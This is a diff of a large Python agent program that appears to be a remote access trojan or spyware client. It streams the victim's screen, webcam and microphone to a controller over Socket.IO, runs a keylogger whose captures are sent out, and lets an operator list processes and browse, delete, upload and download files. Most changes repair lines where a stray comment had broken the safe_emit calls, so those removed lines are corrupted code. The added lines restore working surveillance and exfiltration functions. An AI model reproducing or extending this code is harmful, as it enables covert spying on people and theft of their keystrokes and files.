@@ -5145,7 +5145,7 @@ def camera_send_worker(agent_id):
                         frame_b64 = base64.b64encode(encoded_data).decode('utf-8')
                         frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
                     
-                    safe_emit(  # ✅ SAFE'camera_frame', {
+                    safe_emit('camera_frame', {
                         'agent_id': agent_id,
                         'frame': frame_data_url
                     })
@@ -5375,7 +5375,7 @@ def audio_send_worker(agent_id):
                 
                 # Send via socket.io (binary data is automatically detected)
                 try:
-                    safe_emit(  # ✅ SAFE'audio_frame', {
+                    safe_emit('audio_frame', {
                         'agent_id': agent_id,
                         'frame': encoded_data
                     })
@@ -5467,7 +5467,7 @@ def stream_screen_simple_socketio(agent_id):
                             else:
                                 try:
                                     b64 = base64.b64encode(encoded.tobytes()).decode('utf-8')
-                                    safe_emit(  # ✅ SAFE'screen_frame', {'agent_id': agent_id, 'frame': f'data:image/jpeg;base64,{b64}'})
+                                    safe_emit('screen_frame', {'agent_id': agent_id, 'frame': f'data:image/jpeg;base64,{b64}'})
                                 except Exception as send_err:
                                     # Silence namespace/connection race errors and retry on next loop
                                     msg = str(send_err)
@@ -7155,12 +7155,12 @@ def keylogger_worker(agent_id):
                     
                     # Use socket.io for better performance and consistency
                     try:
-                    if sio and sio.connected:
-                        for entry in data_to_send:
-                            safe_emit('keylog_data', {  # ✅ SAFE
-                                'agent_id': agent_id,
-                                'data': entry
-                            })
+                        if sio and sio.connected:
+                            for entry in data_to_send:
+                                safe_emit('keylog_data', {
+                                    'agent_id': agent_id,
+                                    'data': entry
+                                })
                         else:
                             log_message("Socket.io not connected, buffering keylog data", "warning")
                             # Re-add data to buffer if connection is down
@@ -7231,9 +7231,6 @@ def start_keylogger(agent_id):
             log_message(f"Failed to start keylogger: {e}", "error")
             KEYLOGGER_ENABLED = False
             return False
-    else:
-        log_message("Keylogger already enabled")
-        return True
 
 def stop_keylogger():
     """Stop the keylogger."""
@@ -7502,7 +7499,7 @@ def on_file_chunk_from_operator(data):
             log_message(f"File {filename}: received {received_size}/{total_size} bytes ({progress}%)")
             
             # ✅ SEND PROGRESS UPDATE TO UI!
-            safe_emit(  # ✅ SAFE'file_upload_progress', {
+            safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7515,7 +7512,7 @@ def on_file_chunk_from_operator(data):
             log_message(f"File {filename}: received {received_size} bytes (waiting for total_size or completion event)")
             
             # ✅ SEND PROGRESS UPDATE (unknown total)
-            safe_emit(  # ✅ SAFE'file_upload_progress', {
+            safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7531,7 +7528,7 @@ def on_file_chunk_from_operator(data):
             _save_completed_file(destination_path, buffers[destination_path])
             
             # ✅ SEND COMPLETION EVENT TO UI!
-            safe_emit(  # ✅ SAFE'file_upload_complete', {
+            safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7586,7 +7583,7 @@ def on_file_upload_complete_from_operator(data):
             
             # ✅ SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
             file_size = sum(len(c[1]) for c in buffer_data['chunks'])
-            safe_emit(  # ✅ SAFE'file_upload_progress', {
+            safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7594,7 +7591,7 @@ def on_file_upload_complete_from_operator(data):
                 'total': file_size,
                 'progress': 100  # ✅ 100% complete!
             })
-            safe_emit(  # ✅ SAFE'file_upload_complete', {
+            safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
                 'destination_path': destination_path,
@@ -7657,7 +7654,7 @@ def on_request_file_chunk_from_agent(data):
             log_message(f"  - {path}")
         
         # Send error back to UI
-        safe_emit(  # ✅ SAFE'file_chunk_from_agent', {
+        safe_emit('file_chunk_from_agent', {
             'agent_id': get_or_create_agent_id(),
             'filename': filename,
             'error': f'File not found: {filename}. Last browsed dir: {LAST_BROWSED_DIRECTORY or "None"}'
@@ -7682,7 +7679,7 @@ def on_request_file_chunk_from_agent(data):
                 chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
                 
                 # Send file chunk
-                safe_emit(  # ✅ SAFE'file_chunk_from_agent', {
+                safe_emit('file_chunk_from_agent', {
                     'agent_id': agent_id,
                     'filename': filename_only,
                     'chunk': chunk_b64,
@@ -7698,7 +7695,7 @@ def on_request_file_chunk_from_agent(data):
                 log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset} ({progress}%)")
                 
                 # ✅ SEND DOWNLOAD PROGRESS UPDATE TO UI!
-                safe_emit(  # ✅ SAFE'file_download_progress', {
+                safe_emit('file_download_progress', {
                     'agent_id': agent_id,
                     'filename': filename_only,
                     'sent': offset,
@@ -7709,7 +7706,7 @@ def on_request_file_chunk_from_agent(data):
         log_message(f"File {file_path} sent to controller in {chunk_count} chunks")
         
         # ✅ SEND DOWNLOAD COMPLETION EVENT TO UI!
-        safe_emit(  # ✅ SAFE'file_download_complete', {
+        safe_emit('file_download_complete', {
             'agent_id': agent_id,
             'filename': filename_only,
             'size': total_size,
@@ -8053,7 +8050,7 @@ def main_loop(agent_id):
                             'nice': info.get('nice') or 0,
                             'num_threads': info.get('num_threads') or 0,
                         })
-                    safe_emit(  # ✅ SAFE'process_list', {'agent_id': agent_id, 'processes': proc_list})
+                    safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
                     output = f"Sent {len(proc_list)} processes"
                 except Exception as e:
                     output = f"Error listing processes: {e}"
@@ -8077,7 +8074,7 @@ def main_loop(agent_id):
                                 })
                             except Exception:
                                 continue
-                    safe_emit(  # ✅ SAFE'file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
+                    safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
                     output = f"Listed {len(entries)} entries in {path}"
                 except Exception as e:
                     output = f"Error listing directory: {e}"
@@ -10526,7 +10523,7 @@ def connect():
     # Connection message
     log_message(f"Connected to server. Registering with agent_id: {agent_id}")
     
-    safe_emit(  # ✅ SAFE'agent_connect', {'agent_id': agent_id})
+    safe_emit('agent_connect', {'agent_id': agent_id})
     
     # Emit WebRTC status if available
     if AIORTC_AVAILABLE:
@@ -10588,7 +10585,7 @@ def on_start_stream(data):
         if stream_type == 'screen':
             start_streaming(agent_id)
             log_message(f"[START_STREAM] Screen streaming started")
-            safe_emit(  # ✅ SAFE'stream_started', {
+            safe_emit('stream_started', {
                 'agent_id': agent_id,
                 'type': 'screen',
                 'status': 'success'
@@ -10596,7 +10593,7 @@ def on_start_stream(data):
         elif stream_type == 'camera':
             start_camera_streaming(agent_id)
             log_message(f"[START_STREAM] Camera streaming started")
-            safe_emit(  # ✅ SAFE'stream_started', {
+            safe_emit('stream_started', {
                 'agent_id': agent_id,
                 'type': 'camera',
                 'status': 'success'
@@ -10604,21 +10601,21 @@ def on_start_stream(data):
         elif stream_type == 'audio':
             start_audio_streaming(agent_id)
             log_message(f"[START_STREAM] Audio streaming started")
-            safe_emit(  # ✅ SAFE'stream_started', {
+            safe_emit('stream_started', {
                 'agent_id': agent_id,
                 'type': 'audio',
                 'status': 'success'
             })
         else:
             log_message(f"[START_STREAM] Unknown stream type: {stream_type}", "warning")
-            safe_emit(  # ✅ SAFE'stream_error', {
+            safe_emit('stream_error', {
                 'agent_id': agent_id,
                 'type': stream_type,
                 'error': f'Unknown stream type: {stream_type}'
             })
     except Exception as e:
         log_message(f"[START_STREAM] Error starting {stream_type} stream: {e}", "error")
-        safe_emit(  # ✅ SAFE'stream_error', {
+        safe_emit('stream_error', {
             'agent_id': agent_id,
             'type': stream_type,
             'error': str(e)
@@ -10639,7 +10636,7 @@ def on_stop_stream(data):
         if stream_type == 'screen':
             stop_streaming()
             log_message(f"[STOP_STREAM] Screen streaming stopped")
-            safe_emit(  # ✅ SAFE'stream_stopped', {
+            safe_emit('stream_stopped', {
                 'agent_id': agent_id,
                 'type': 'screen',
                 'status': 'success'
@@ -10647,7 +10644,7 @@ def on_stop_stream(data):
         elif stream_type == 'camera':
             stop_camera_streaming()
             log_message(f"[STOP_STREAM] Camera streaming stopped")
-            safe_emit(  # ✅ SAFE'stream_stopped', {
+            safe_emit('stream_stopped', {
                 'agent_id': agent_id,
                 'type': 'camera',
                 'status': 'success'
@@ -10655,7 +10652,7 @@ def on_stop_stream(data):
         elif stream_type == 'audio':
             stop_audio_streaming()
             log_message(f"[STOP_STREAM] Audio streaming stopped")
-            safe_emit(  # ✅ SAFE'stream_stopped', {
+            safe_emit('stream_stopped', {
                 'agent_id': agent_id,
                 'type': 'audio',
                 'status': 'success'
@@ -10715,7 +10712,7 @@ def on_command(data):
                     'nice': info.get('nice') or 0,
                     'num_threads': info.get('num_threads') or 0,
                 })
-            safe_emit(  # ✅ SAFE'process_list', {'agent_id': agent_id, 'processes': proc_list})
+            safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
             output = f"Sent {len(proc_list)} processes"
         except Exception as e:
             output = f"Error listing processes: {e}"
@@ -10745,7 +10742,7 @@ def on_command(data):
                         })
                     except Exception:
                         continue
-            safe_emit(  # ✅ SAFE'file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
+            safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
             output = f"Listed {len(entries)} entries in {path}"
         except Exception as e:
             output = f"Error listing directory: {e}"
@@ -10760,10 +10757,10 @@ def on_command(data):
                 import shutil
                 shutil.rmtree(path)
                 ok = True
-            safe_emit(  # ✅ SAFE'file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
+            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
             output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
         except Exception as e:
-            safe_emit(  # ✅ SAFE'file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
+            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
             output = f"Error deleting: {e}"
     elif command.startswith("rename-file:" ):
         try:
@@ -10774,19 +10771,19 @@ def on_command(data):
             if src and dst:
                 os.rename(src, dst)
                 ok = True
-            safe_emit(  # ✅ SAFE'file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
+            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
             output = f"Renamed to: {dst}" if ok else "Rename failed"
         except Exception as e:
-            safe_emit(  # ✅ SAFE'file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
+            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
             output = f"Error renaming: {e}"
     elif command.startswith("mkdir:" ):
         try:
             path = command.split(":",1)[1]
             os.makedirs(path, exist_ok=True)
-            safe_emit(  # ✅ SAFE'file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
+            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
             output = f"Created: {path}"
         except Exception as e:
-            safe_emit(  # ✅ SAFE'file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
+            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
             output = f"Error mkdir: {e}"
     elif command.startswith("upload-file:"):
         # New chunked file upload
@@ -10978,14 +10975,14 @@ def on_file_upload(data):
     """Handle file upload via Socket.IO."""
     try:
         if not data or not isinstance(data, dict):
-            safe_emit(  # ✅ SAFE'file_upload_result', {'success': False, 'error': 'Invalid data format'})
+            safe_emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
             return
         
         destination_path = data.get('destination_path')
         file_content_b64 = data.get('content')
         
         if not destination_path or not file_content_b64:
-            safe_emit(  # ✅ SAFE'file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
+            safe_emit('file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
             return
         
         # Use the existing handle_file_upload function
@@ -10994,10 +10991,10 @@ def on_file_upload(data):
         # Check if upload was successful
         success = not result.startswith('Error:') and not result.startswith('File upload failed:')
         
-        safe_emit(  # ✅ SAFE'file_upload_result', {'success': success, 'result': result})
+        safe_emit('file_upload_result', {'success': success, 'result': result})
         
     except Exception as e:
-        safe_emit(  # ✅ SAFE'file_upload_result', {'success': False, 'error': str(e)})
+        safe_emit('file_upload_result', {'success': False, 'error': str(e)})
 
 # ========================================================================================
 # WEBRTC SIGNALING EVENT HANDLERS FOR LOW-LATENCY STREAMING
@@ -11016,7 +11013,7 @@ def on_webrtc_offer(data):
         enable_camera = data.get('enable_camera', False)
         
         if not offer_sdp:
-            safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP offer'})
+            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP offer'})
             return
         
         log_message(f"Received WebRTC offer for agent {agent_id}")
@@ -11024,17 +11021,17 @@ def on_webrtc_offer(data):
         # Start WebRTC streaming with the received offer
         if AIORTC_AVAILABLE:
             start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
-            safe_emit(  # ✅ SAFE'webrtc_offer_accepted', {'agent_id': agent_id})
+            safe_emit('webrtc_offer_accepted', {'agent_id': agent_id})
         else:
             # Fallback to Socket.IO streaming
             log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
             start_streaming(agent_id)
-            safe_emit(  # ✅ SAFE'webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
             
     except Exception as e:
         error_msg = f"WebRTC offer handling failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_answer(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11046,7 +11043,7 @@ def on_webrtc_answer(data):
         answer_sdp = data.get('sdp')
         
         if not answer_sdp:
-            safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP answer'})
+            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP answer'})
             return
         
         log_message(f"Received WebRTC answer for agent {agent_id}")
@@ -11054,14 +11051,14 @@ def on_webrtc_answer(data):
         if AIORTC_AVAILABLE:
             # Handle the answer asynchronously
             asyncio.create_task(handle_webrtc_answer(agent_id, answer_sdp))
-            safe_emit(  # ✅ SAFE'webrtc_answer_received', {'agent_id': agent_id})
+            safe_emit('webrtc_answer_received', {'agent_id': agent_id})
         else:
             log_message("WebRTC not available, cannot handle answer", "warning")
             
     except Exception as e:
         error_msg = f"WebRTC answer handling failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_ice_candidate(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11073,7 +11070,7 @@ def on_webrtc_ice_candidate(data):
         candidate_data = data.get('candidate')
         
         if not candidate_data:
-            safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': agent_id, 'error': 'Missing ICE candidate data'})
+            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing ICE candidate data'})
             return
         
         log_message(f"Received ICE candidate for agent {agent_id}")
@@ -11087,7 +11084,7 @@ def on_webrtc_ice_candidate(data):
     except Exception as e:
         error_msg = f"ICE candidate handling failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_start_streaming(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11104,17 +11101,17 @@ def on_webrtc_start_streaming(data):
         
         if AIORTC_AVAILABLE:
             start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
-            safe_emit(  # ✅ SAFE'webrtc_streaming_started', {'agent_id': agent_id})
+            safe_emit('webrtc_streaming_started', {'agent_id': agent_id})
         else:
             # Fallback to Socket.IO streaming
             log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
             start_streaming(agent_id)
-            safe_emit(  # ✅ SAFE'webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
             
     except Exception as e:
         error_msg = f"WebRTC streaming start failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_stop_streaming(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11128,16 +11125,16 @@ def on_webrtc_stop_streaming(data):
         
         if AIORTC_AVAILABLE:
             stop_webrtc_streaming(agent_id)
-            safe_emit(  # ✅ SAFE'webrtc_streaming_stopped', {'agent_id': agent_id})
+            safe_emit('webrtc_streaming_stopped', {'agent_id': agent_id})
         else:
             # Fallback to Socket.IO streaming stop
             stop_streaming()
-            safe_emit(  # ✅ SAFE'webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
             
     except Exception as e:
         error_msg = f"WebRTC streaming stop failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_stats(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11149,7 +11146,7 @@ def on_webrtc_get_stats(data):
         
         if AIORTC_AVAILABLE:
             stats = get_webrtc_stats(agent_id)
-            safe_emit(  # ✅ SAFE'webrtc_stats', {'agent_id': agent_id, 'stats': stats})
+            safe_emit('webrtc_stats', {'agent_id': agent_id, 'stats': stats})
         else:
             # Return fallback stats
             fallback_stats = {
@@ -11159,12 +11156,12 @@ def on_webrtc_get_stats(data):
                 'latency': 0,
                 'bandwidth': 0
             }
-            safe_emit(  # ✅ SAFE'webrtc_stats', {'agent_id': agent_id, 'stats': fallback_stats})
+            safe_emit('webrtc_stats', {'agent_id': agent_id, 'stats': fallback_stats})
             
     except Exception as e:
         error_msg = f"WebRTC stats request failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_set_quality(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11186,14 +11183,14 @@ def on_webrtc_set_quality(data):
                 if hasattr(track, 'set_fps'):
                     track.set_fps(fps)
             
-            safe_emit(  # ✅ SAFE'webrtc_quality_updated', {'agent_id': agent_id, 'quality': quality, 'fps': fps})
+            safe_emit('webrtc_quality_updated', {'agent_id': agent_id, 'quality': quality, 'fps': fps})
         else:
             log_message("WebRTC streams not available for quality adjustment", "warning")
             
     except Exception as e:
         error_msg = f"WebRTC quality adjustment failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_quality_change(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11209,7 +11206,7 @@ def on_webrtc_quality_change(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Apply quality level changes
             result = adaptive_bitrate_control(agent_id, quality_level)
-            safe_emit(  # ✅ SAFE'webrtc_quality_changed', {
+            safe_emit('webrtc_quality_changed', {
                 'agent_id': agent_id, 
                 'quality_level': quality_level,
                 'result': result
@@ -11220,7 +11217,7 @@ def on_webrtc_quality_change(data):
     except Exception as e:
         error_msg = f"WebRTC quality change failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_frame_dropping(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11236,7 +11233,7 @@ def on_webrtc_frame_dropping(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Implement frame dropping
             result = implement_frame_dropping(agent_id, load_threshold)
-            safe_emit(  # ✅ SAFE'webrtc_frame_dropping_implemented', {
+            safe_emit('webrtc_frame_dropping_implemented', {
                 'agent_id': agent_id,
                 'load_threshold': load_threshold,
                 'result': result
@@ -11247,7 +11244,7 @@ def on_webrtc_frame_dropping(data):
     except Exception as e:
         error_msg = f"WebRTC frame dropping failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_enhanced_stats(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11262,7 +11259,7 @@ def on_webrtc_get_enhanced_stats(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Get enhanced monitoring data
             monitoring_data = enhanced_webrtc_monitoring()
-            safe_emit(  # ✅ SAFE'webrtc_enhanced_stats', {
+            safe_emit('webrtc_enhanced_stats', {
                 'agent_id': agent_id,
                 'stats': monitoring_data
             })
@@ -11272,7 +11269,7 @@ def on_webrtc_get_enhanced_stats(data):
     except Exception as e:
         error_msg = f"WebRTC enhanced stats failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_production_readiness(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11286,7 +11283,7 @@ def on_webrtc_get_production_readiness(data):
         
         # Get production readiness assessment
         readiness = assess_production_readiness()
-        safe_emit(  # ✅ SAFE'webrtc_production_readiness', {
+        safe_emit('webrtc_production_readiness', {
             'agent_id': agent_id,
             'readiness': readiness
         })
@@ -11294,7 +11291,7 @@ def on_webrtc_get_production_readiness(data):
     except Exception as e:
         error_msg = f"Production readiness assessment failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_migration_plan(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11308,7 +11305,7 @@ def on_webrtc_get_migration_plan(data):
         
         # Generate migration plan
         migration_plan = generate_mediasoup_migration_plan()
-        safe_emit(  # ✅ SAFE'webrtc_migration_plan', {
+        safe_emit('webrtc_migration_plan', {
             'agent_id': agent_id,
             'plan': migration_plan
         })
@@ -11316,7 +11313,7 @@ def on_webrtc_get_migration_plan(data):
     except Exception as e:
         error_msg = f"Migration plan generation failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_monitoring_data(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11331,7 +11328,7 @@ def on_webrtc_get_monitoring_data(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Get comprehensive monitoring data
             monitoring_data = enhanced_webrtc_monitoring()
-            safe_emit(  # ✅ SAFE'webrtc_monitoring_data', {
+            safe_emit('webrtc_monitoring_data', {
                 'agent_id': agent_id,
                 'data': monitoring_data
             })
@@ -11341,7 +11338,7 @@ def on_webrtc_get_monitoring_data(data):
     except Exception as e:
         error_msg = f"WebRTC monitoring data failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_adaptive_bitrate_control(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11357,7 +11354,7 @@ def on_webrtc_adaptive_bitrate_control(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Trigger adaptive bitrate control
             result = adaptive_bitrate_control(agent_id, current_quality)
-            safe_emit(  # ✅ SAFE'webrtc_adaptive_bitrate_result', {
+            safe_emit('webrtc_adaptive_bitrate_result', {
                 'agent_id': agent_id,
                 'current_quality': current_quality,
                 'result': result
@@ -11368,7 +11365,7 @@ def on_webrtc_adaptive_bitrate_control(data):
     except Exception as e:
         error_msg = f"WebRTC adaptive bitrate control failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_implement_frame_dropping(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -11384,7 +11381,7 @@ def on_webrtc_implement_frame_dropping(data):
         if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
             # Implement frame dropping
             result = implement_frame_dropping(agent_id, load_threshold)
-            safe_emit(  # ✅ SAFE'webrtc_frame_dropping_result', {
+            safe_emit('webrtc_frame_dropping_result', {
                 'agent_id': agent_id,
                 'load_threshold': load_threshold,
                 'result': result
@@ -11395,7 +11392,7 @@ def on_webrtc_implement_frame_dropping(data):
     except Exception as e:
         error_msg = f"WebRTC frame dropping implementation failed: {str(e)}"
         log_message(error_msg, "error")
-        safe_emit(  # ✅ SAFE'webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def get_webrtc_status():
     """Get comprehensive WebRTC status and capabilities."""
@@ -11430,7 +11427,7 @@ def emit_webrtc_status():
     try:
         agent_id = get_or_create_agent_id()
         status = get_webrtc_status()
-        safe_emit(  # ✅ SAFE'webrtc_status', {'agent_id': agent_id, 'status': status})
+        safe_emit('webrtc_status', {'agent_id': agent_id, 'status': status})
         log_message(f"WebRTC status emitted: {status['enabled']}")
     except Exception as e:
         log_message(f"Failed to emit WebRTC status: {e}", "error")
@@ -12215,7 +12212,7 @@ def screen_send_worker(agent_id):
                     # Encode frame as base64 data URL for browser display
                     frame_b64 = base64.b64encode(frame).decode('utf-8')
                     frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
-                    safe_emit(  # ✅ SAFE'screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
+                    safe_emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
                 except Exception as e:
                     error_msg = str(e)
                     # Silence "not a connected namespace" errors
